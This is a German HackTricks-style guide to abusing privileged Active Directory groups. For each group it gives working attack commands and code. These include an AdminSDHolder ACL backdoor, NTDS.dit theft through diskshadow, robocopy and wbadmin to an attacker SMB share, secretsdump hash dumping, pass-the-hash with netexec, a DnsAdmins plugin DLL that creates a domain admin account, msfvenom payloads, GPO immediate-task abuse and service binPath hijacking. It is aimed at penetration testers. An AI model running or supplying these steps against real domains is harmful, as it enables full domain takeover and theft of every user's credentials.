# Privilegierte Gruppen

{{#include ../../banners/hacktricks-training.md}}

## Bekannte Gruppen mit Administrationsrechten

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Diese Gruppe ist befugt, Konten und Gruppen zu erstellen, die keine Administratoren in der Domäne sind. Zusätzlich ermöglicht sie die lokale Anmeldung am Domänencontroller (DC).

Um die Mitglieder dieser Gruppe zu ermitteln, wird der folgende Befehl ausgeführt:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Das Hinzufügen neuer Benutzer ist erlaubt, ebenso die lokale Anmeldung am DC.

## AdminSDHolder-Gruppe

Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie die Berechtigungen für alle "protected groups" in Active Directory festlegt, einschließlich hochprivilegierter Gruppen. Dieser Mechanismus schützt diese Gruppen, indem er unautorisierte Änderungen verhindert.

Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer volle Berechtigungen gewährt. Dadurch erhielte dieser Benutzer effektiv die vollständige Kontrolle über alle protected groups. Wenn die Berechtigungen dieses Benutzers geändert oder entfernt werden, werden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.

Neuere Windows Server-Dokumentation behandelt weiterhin mehrere integrierte Operator-Gruppen als **protected** Objekte (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Der **SDProp**-Prozess läuft standardmäßig alle 60 Minuten auf dem **PDC Emulator**, setzt `adminCount=1` und deaktiviert die Vererbung bei geschützten Objekten. Das ist sowohl für Persistenz nützlich als auch beim Aufspüren veralteter privilegierter Benutzer, die aus einer geschützten Gruppe entfernt wurden, aber weiterhin die nicht-vererbende ACL behalten.

Befehle zum Überprüfen der Mitglieder und Ändern von Berechtigungen umfassen:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Ein Skript ist verfügbar, um den Wiederherstellungsprozess zu beschleunigen: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Für weitere Details besuchen Sie [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Die Mitgliedschaft in dieser Gruppe erlaubt das Lesen gelöschter Active Directory-Objekte, was sensible Informationen offenlegen kann:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Das ist nützlich für die **Wiederherstellung früherer Berechtigungswege**. Gelöschte Objekte können weiterhin `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, alte SPNs oder den DN einer gelöschten privilegierten Gruppe offenlegen, die später von einem anderen Operator wiederhergestellt werden kann.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Zugriff auf den Domain Controller

Der Zugriff auf Dateien auf dem Domain Controller ist eingeschränkt, es sei denn, der Benutzer ist Mitglied der Gruppe `Server Operators`, die die Zugriffsrechte ändert.

### Privilege Escalation

Mit `PsService` oder `sc` aus Sysinternals kann man Dienstberechtigungen prüfen und ändern. Die Gruppe `Server Operators` hat zum Beispiel Vollzugriff auf bestimmte Dienste, was die Ausführung beliebiger Befehle und privilege escalation ermöglicht:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Dieser Befehl zeigt, dass `Server Operators` vollen Zugriff haben, was die Manipulation von Diensten zum Erlangen erhöhter Privilegien ermöglicht.

## Backup Operators

Die Mitgliedschaft in der Gruppe `Backup Operators` gewährt Zugriff auf das Dateisystem von `DC01` aufgrund der Privilegien `SeBackup` und `SeRestore`. Diese Privilegien erlauben das Durchqueren von Ordnern, Auflisten und Kopieren von Dateien, selbst ohne explizite Berechtigungen, unter Verwendung des Flags `FILE_FLAG_BACKUP_SEMANTICS`. Für diesen Vorgang ist die Verwendung spezifischer Scripts erforderlich.

Um die Gruppenmitglieder aufzulisten, führe aus:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokaler Angriff

Um diese Privilegien lokal zu nutzen, werden die folgenden Schritte ausgeführt:

1. Notwendige Bibliotheken importieren:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` aktivieren und überprüfen:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Auf Dateien in eingeschränkten Verzeichnissen zugreifen und sie kopieren, zum Beispiel:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Direkter Zugriff auf das Dateisystem des Domänencontrollers ermöglicht das Stehlen der `NTDS.dit`-Datenbank, die alle NTLM-Hashes für Domänenbenutzer und -computer enthält.

#### Mit diskshadow.exe

1. Erstelle eine Schattenkopie des `C`-Laufwerks:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopiere `NTDS.dit` aus der Shadow Copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativ verwenden Sie `robocopy` zum Kopieren von Dateien:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrahiere `SYSTEM` und `SAM` zum Abrufen von Hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Rufe alle hashes aus `NTDS.dit` ab:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Nach der Extraktion: Pass-the-Hash zum DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Verwendung von wbadmin.exe

1. Richte ein NTFS-Dateisystem für den SMB-Server auf der Angreifer-Maschine ein und zwischenspeichere SMB-Anmeldeinformationen auf dem Zielsystem.
2. Verwende `wbadmin.exe` für System-Backups und die Extraktion von `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Mitglieder der **DnsAdmins**-Gruppe können ihre Privilegien ausnutzen, um eine beliebige DLL mit SYSTEM-Rechten auf einem DNS-Server zu laden, der oft auf Domain Controllers gehostet wird. Diese Fähigkeit eröffnet erhebliche Ausnutzungsmöglichkeiten.

Um Mitglieder der DnsAdmins-Gruppe aufzulisten, verwenden Sie:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Diese Schwachstelle ermöglicht die Ausführung von beliebigem Code mit SYSTEM-Rechten im DNS‑Dienst (meist innerhalb der DCs). Dieses Problem wurde 2021 behoben.

Mitglieder können den DNS‑Server dazu bringen, eine beliebige DLL zu laden (entweder lokal oder von einer entfernten Freigabe) mit Befehlen wie:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ein Neustart des DNS-Dienstes (der zusätzliche Berechtigungen erfordern kann) ist erforderlich, damit die DLL geladen wird:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Für weitere Details zu diesem Angriffsvektor, siehe ired.team.

#### Mimilib.dll

Es ist auch möglich, mimilib.dll für die Ausführung von Befehlen zu verwenden, indem man sie so modifiziert, dass sie bestimmte Befehle oder reverse shells ausführt. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) für weitere Informationen.

### WPAD-Eintrag für MitM

DnsAdmins können DNS-Einträge manipulieren, um Man-in-the-Middle (MitM)-Angriffe durchzuführen, indem sie nach Deaktivierung der globalen Query-Blockliste einen WPAD-Eintrag erstellen. Tools wie Responder oder Inveigh können für spoofing und das Abfangen von Netzwerkverkehr verwendet werden.

### Event Log Readers
Mitglieder können auf Ereignisprotokolle zugreifen und dabei potenziell sensible Informationen wie Klartext-Passwörter oder Details zur Befehlsausführung finden:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Diese Gruppe kann DACLs am Domänenobjekt ändern und dadurch möglicherweise DCSync privileges gewähren. Techniken zur privilege escalation, die diese Gruppe ausnutzen, sind im Exchange-AD-Privesc GitHub repo detailliert beschrieben.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Wenn Sie als Mitglied dieser Gruppe agieren können, besteht der klassische Missbrauch darin, einem attacker-controlled principal die Replikationsrechte zu gewähren, die für [DCSync](dcsync.md) benötigt werden:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historisch hat **PrivExchange** mailbox access, coerced Exchange authentication und LDAP relay verknüpft, um auf denselben Mechanismus zu gelangen. Selbst wenn dieser relay-Pfad mitigiert ist, bleibt direkte Mitgliedschaft in `Exchange Windows Permissions` oder die Kontrolle über einen Exchange server ein hochgradig wertvoller Weg zu Domain-Replication-Rechten.

## Hyper-V Administrators

Hyper-V Administrators haben vollen Zugriff auf Hyper-V, was ausgenutzt werden kann, um Kontrolle über virtualisierte Domain Controllers zu erlangen. Dazu gehört das Klonen laufender DCs und das Extrahieren von NTLM-Hashes aus der Datei `NTDS.dit`.

### Exploitation Example

Der praktische Missbrauch besteht in der Regel in offline access zu DC-disks/checkpoints statt in alten host-level LPE tricks. Mit Zugriff auf den Hyper-V host kann ein Operator einen virtualisierten Domain Controller checkpointen oder exportieren, die VHDX mounten und `NTDS.dit`, `SYSTEM` und andere Geheimnisse extrahieren, ohne LSASS im Gast zu berühren:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Von dort aus verwende erneut den `Backup Operators`-Workflow, um `Windows\NTDS\ntds.dit` und die Registry-Hives offline zu kopieren.

## Group Policy Creators Owners

Diese Gruppe erlaubt Mitgliedern, Group Policies in der Domäne zu erstellen. Allerdings können ihre Mitglieder Group Policies nicht auf Benutzer oder Gruppen anwenden oder bestehende GPOs bearbeiten.

Der wichtige Unterschied ist, dass **der Ersteller Eigentümer des neuen GPO wird** und in der Regel danach genügend Rechte hat, es zu bearbeiten. Das macht diese Gruppe interessant, wenn du entweder:

- ein bösartiges GPO erstellen und einen Admin dazu bringen kannst, es an eine Ziel-OU/Domäne zu verknüpfen
- ein von dir erstelltes GPO bearbeiten kannst, das bereits irgendwo nützlich verknüpft ist
- ein anderes delegiertes Recht ausnutzen kannst, das dir erlaubt, GPOs zu verknüpfen, während diese Gruppe dir die Bearbeitungsrechte gibt

Praktisch bedeutet Missbrauch normalerweise, über SYSVOL-gestützte Policy-Dateien eine **Immediate Task**, ein **startup script**, eine **local admin membership** oder eine Änderung der **user rights assignment** hinzuzufügen.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Wenn du die GPO manuell über `SYSVOL` bearbeitest, bedenke, dass die Änderung allein nicht ausreicht: `versionNumber`, `GPT.ini` und manchmal `gPCMachineExtensionNames` müssen ebenfalls aktualisiert werden, sonst ignorieren Clients die Aktualisierung der Richtlinie.

## Organization Management

In Umgebungen, in denen **Microsoft Exchange** eingesetzt ist, verfügt eine spezielle Gruppe, bekannt als **Organization Management**, über weitreichende Befugnisse. Diese Gruppe hat das Privileg, **auf die Postfächer aller Domain-Benutzer zuzugreifen**, und besitzt die **volle Kontrolle über die Organisationseinheit (OU) 'Microsoft Exchange Security Groups'**. Diese Kontrolle umfasst die Gruppe **`Exchange Windows Permissions`**, die für Privilegieneskalation ausgenutzt werden kann.

### Privilegienausnutzung und Befehle

#### Print Operators

Mitglieder der **Print Operators**-Gruppe besitzen mehrere Privilegien, einschließlich **`SeLoadDriverPrivilege`**, das ihnen erlaubt, sich **lokal an einem Domain Controller anzumelden**, diesen herunterzufahren und Drucker zu verwalten. Um diese Privilegien auszunutzen — insbesondere wenn **`SeLoadDriverPrivilege`** im nicht-elevated Kontext nicht sichtbar ist — ist ein Umgehen von User Account Control (UAC) erforderlich.

Um die Mitglieder dieser Gruppe aufzulisten, wird der folgende PowerShell-Befehl verwendet:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Auf Domain Controllern ist diese Gruppe gefährlich, weil die Standard-Domain-Controller-Richtlinie **`SeLoadDriverPrivilege`** an `Print Operators` gewährt. Wenn Sie ein erhöhtes Token für ein Mitglied dieser Gruppe erhalten, können Sie das Privileg aktivieren und einen signierten, aber verwundbaren Treiber laden, um in den Kernel/SYSTEM zu gelangen. Für Details zur Token-Verwaltung siehe [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Den Mitgliedern dieser Gruppe wird Zugriff auf PCs über Remote Desktop Protocol (RDP) gewährt. Um diese Mitglieder aufzulisten, stehen PowerShell-Befehle zur Verfügung:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Weitere Einblicke in die Ausnutzung von RDP finden sich in speziellen pentesting-Ressourcen.

#### Remote-Management-Benutzer

Mitglieder können über **Windows Remote Management (WinRM)** auf PCs zugreifen. Die Enumeration dieser Mitglieder erfolgt durch:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Für Exploitation-Techniken im Zusammenhang mit **WinRM** sollte spezifische Dokumentation zu Rate gezogen werden.

#### Server Operators

Diese Gruppe hat Berechtigungen, verschiedene Konfigurationen an Domain Controllern vorzunehmen, einschließlich Backup- und Restore-Rechten, dem Ändern der Systemzeit und dem Herunterfahren des Systems. Um die Mitglieder aufzulisten, wird folgender Befehl verwendet:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Auf Domänencontrollern erben `Server Operators` üblicherweise genügend Rechte, um **Dienste neu zu konfigurieren oder zu starten/anzuhalten**, und erhalten außerdem durch die Standard-DC-Richtlinie `SeBackupPrivilege`/`SeRestorePrivilege`. Das macht sie in der Praxis zu einer Brücke zwischen **service-control abuse** und **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Wenn ein Service-ACL dieser Gruppe Änder-/Startrechte gewährt, weise den Service auf einen beliebigen Befehl, starte ihn als `LocalSystem` und stelle anschließend den ursprünglichen `binPath` wieder her. Ist die Service-Steuerung eingeschränkt, greife auf die oben beschriebenen `Backup Operators`-Techniken zurück, um `NTDS.dit` zu kopieren.

## Quellen <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
